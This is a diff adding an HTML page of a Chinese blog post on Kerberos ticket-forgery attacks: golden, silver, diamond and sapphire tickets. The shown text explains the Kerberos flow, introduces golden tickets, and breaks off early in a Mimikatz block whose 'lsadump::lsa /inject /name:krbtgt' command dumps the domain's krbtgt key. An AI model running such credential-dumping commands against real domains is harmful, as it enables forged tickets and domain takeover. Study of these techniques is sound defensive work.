@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01 Kerberos 身份认证流程Kerberos 是一种基于票证的身份验证协议。它基本上是这样工作的： 1.客户端向KDC（Key Distribution Center，通常是域控制器）请求TGT（Ticket Granting Ticket）。请求用户的密钥之一用于预身份验证。 TGT 由身份验证服务 (AS) 提供。客户端的请求被称为AS-REQ，应答被称为AS-REP。 2.客户端">
+<meta property="og:type" content="article">
+<meta property="og:title" content="四种票据利用方式">
+<meta property="og:url" content="https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="0x01 Kerberos 身份认证流程Kerberos 是一种基于票证的身份验证协议。它基本上是这样工作的： 1.客户端向KDC（Key Distribution Center，通常是域控制器）请求TGT（Ticket Granting Ticket）。请求用户的密钥之一用于预身份验证。 TGT 由身份验证服务 (AS) 提供。客户端的请求被称为AS-REQ，应答被称为AS-REP。 2.客户端">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920132-d7111175-46f6-4245-b825-10ad5b56527b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536919568-de374eda-8ece-45b5-ab52-ce4984131caf.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536919874-eb4a1d76-807d-4699-970c-63d8606cdb21.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920030-88794d9a-2066-4d7c-8b69-af3b1047d3cb.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536919992-325b75f9-de36-4e4f-a1fd-9b5362444dd4.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920153-a90822c1-1178-4dff-9933-764b23e2d80a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920410-95021d33-5561-4ba8-86f2-4011e5817528.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920540-bd8c1f6a-de16-4891-8dbd-0ab0bb6c2f46.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920760-a3769aaf-15b1-415d-84d1-2a06ffc9e052.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920704-f6fea906-e0db-42f1-acce-10650b09e3e5.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920572-10f68acf-784b-453f-b6ed-96c5db63a308.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920830-4918c11a-cce1-4312-93b3-fb8902caeff7.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921036-4de8a07f-7ede-4458-85c0-f3f33357bdff.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921311-a8299fae-3003-4348-9955-769e80fc3a03.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921522-7c4f808b-771e-4383-9082-4ab52c78ff7c.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921338-6f6a3068-9147-4607-8b03-f310ff8a3ec7.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921259-808acbec-9796-4f9d-a204-00cea47f560c.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921385-2dffc8b8-5d8a-419f-a471-5c40b293a275.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921665-4ee8aff1-f92f-4fd4-917c-d772ee74946f.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921725-9df94bfe-a8de-4fae-ba1b-c0186f83c0b1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921761-03d46e3f-0413-4217-99e3-1e890e475700.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922395-930e9a08-e795-45cf-aadd-55fbdf985673.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536921875-823e2569-db4e-4d1e-ad5b-b05ac6fadfc4.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922009-c0b4a07f-428f-4a86-8304-d5e4a4f9e7c8.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922048-216b5f33-bb52-40e0-8112-2a31cde5f87e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922104-5c0d301a-4cda-4f2a-98df-9519564ba10d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922304-f15d4dc5-0f08-4339-926a-9224decc76d1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922598-210360e7-d4a6-4ba0-97ee-e61172bd12e6.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922645-20d41036-0050-40c9-bc0e-8ec294ccb659.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922814-b62d59c0-9e90-48e1-bdc2-e509edb3ae89.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922692-99837381-7891-4bc1-b5ba-e63370da5a4a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536922835-ee4de11a-b136-4e08-aa64-f5e739743130.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536923342-f15f079d-489d-405b-abfb-1a649ec8033c.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536923186-65feb858-d341-4059-9350-ca76d1325c73.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536923259-0b1f25be-be36-40ec-9055-b7f64dfcafdf.png">
+<meta property="article:published_time" content="2025-03-10T15:51:29.000Z">
+<meta property="article:modified_time" content="2025-03-21T06:20:55.925Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="域">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920132-d7111175-46f6-4245-b825-10ad5b56527b.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>四种票据利用方式</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/10/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&text=四种票据利用方式"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=四种票据利用方式"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&is_video=false&description=四种票据利用方式"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=四种票据利用方式&body=Check out this article: https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=四种票据利用方式"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=四种票据利用方式"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=四种票据利用方式"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=四种票据利用方式"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&name=四种票据利用方式&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&t=四种票据利用方式"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Kerberos-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 Kerberos 身份认证流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-Golden-Ticket"><span class="toc-number">2.</span> <span class="toc-text">0x02 黄金票据 Golden Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Mimikatz%E6%B3%A8%E5%85%A5%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.3.</span> <span class="toc-text">使用Mimikatz注入票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AC%BA%E9%AA%97%E6%80%A7%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-number">2.4.</span> <span class="toc-text">欺骗性用户名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E6%88%90%E5%91%98%E8%B5%84%E6%A0%BC"><span class="toc-number">2.5.</span> <span class="toc-text">组成员资格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#impacket-%E4%B8%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.6.</span> <span class="toc-text">impacket 下黄金票据的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus-exe-%E4%BC%A0%E9%80%92%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.7.</span> <span class="toc-text">使用 Rubeus.exe 传递票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E4%B8%8B%E7%9A%84-mimikatz"><span class="toc-number">2.8.</span> <span class="toc-text">msf 下的 mimikatz</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Ticket"><span class="toc-number">3.</span> <span class="toc-text">0x03 白银票据 Silver Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="toc-number">3.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">3.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95-mimikatz-%E6%B3%A8%E5%85%A5%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.3.</span> <span class="toc-text">尝试 mimikatz 注入票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-rubeus-%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="toc-number">3.4.</span> <span class="toc-text">使用 rubeus 进行注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%B8%8E%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.5.</span> <span class="toc-text">黄金票据与白银票据的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E9%92%BB%E7%9F%B3%E7%A5%A8%E6%8D%AE-Diamond-Ticket"><span class="toc-number">4.</span> <span class="toc-text">0x04 钻石票据 Diamond Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%BB%E7%9F%B3PAC"><span class="toc-number">4.1.</span> <span class="toc-text">钻石PAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%BB%E7%9F%B3%E7%A5%A8%E6%8D%AE%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">钻石票据攻击利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E8%93%9D%E5%AE%9D%E7%9F%B3%E7%A5%A8%E6%8D%AE-Sapphire-Ticket"><span class="toc-number">5.</span> <span class="toc-text">0x05 蓝宝石票据 Sapphire Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#S4U2self-U2U"><span class="toc-number">5.1.</span> <span class="toc-text">S4U2self + U2U</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%94%9F%E6%88%90%E8%93%9D%E5%AE%9D%E7%9F%B3%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.2.</span> <span class="toc-text">尝试生成蓝宝石票据</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        四种票据利用方式
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-10T15:51:29.000Z" class="dt-published" itemprop="datePublished">2025-03-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%9F%9F/" rel="tag">域</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="0x01-Kerberos-身份认证流程"><a href="#0x01-Kerberos-身份认证流程" class="headerlink" title="0x01 Kerberos 身份认证流程"></a>0x01 Kerberos 身份认证流程</h2><p>Kerberos 是一种基于票证的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81&spm=1001.2101.3001.7020">身份验证</a>协议。它基本上是这样工作的：</p>
+<p>1.<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&spm=1001.2101.3001.7020">客户端</a>向KDC（Key Distribution Center，通常是域控制器）请求TGT（Ticket Granting Ticket）。请求用户的密钥之一用于预身份验证。 TGT 由身份验证服务 (AS) 提供。客户端的请求被称为AS-REQ，应答被称为AS-REP。</p>
+<p>2.客户端使用 TGT 向 KDC 请求 ST（服务票证）。该票证由票证授予服务 (TGS) 提供。客户端的请求被称为TGS-REQ，应答被称为TGS-REP。</p>
+<p>3.客户端使用ST（服务票证）来访问服务。客户端对服务的请求被称为调用AP-REQ，服务的响应被称为调用AP-REP。</p>
+<p>4.两种票证（TGT 和 ST）通常都包含加密的 PAC（特权身份验证证书），目标服务将读取一组信息来决定身份验证用户是否可以访问该服务（用户 ID、组成员身份等） 。</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742536920132-d7111175-46f6-4245-b825-10ad5b56527b.png"></p>
+<h2 id="0x02-黄金票据-Golden-Ticket"><a href="#0x02-黄金票据-Golden-Ticket" class="headerlink" title="0x02 黄金票据 Golden Ticket"></a>0x02 黄金票据 Golden Ticket</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>黄金票证是一种权限维持手段，攻击者获得了对 Active Directory 密钥分发服务帐户 （KRBTGT） 的控制权，并使用该帐户伪造有效的 Kerberos 票证授予票证 （TGT）。这使攻击者能够访问 Active Directory 域上的任何资源，如果有 KRBTGT 哈希，您可以伪造自己的 TGT，其中包括想要的任何组成员身份的 PAC 数据</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>黄金票据的使用的必要票件是获取域中 <code>krbtgt</code> 用户使用的加密密钥之一，然而加密密钥之一就是该账户的<code>NTLM HASH</code>值</p>
+<p>可以使用使用<code>Mimikatz</code>读取密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::lsa /inject /name:krbtgt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Domain : ROOTKIT / 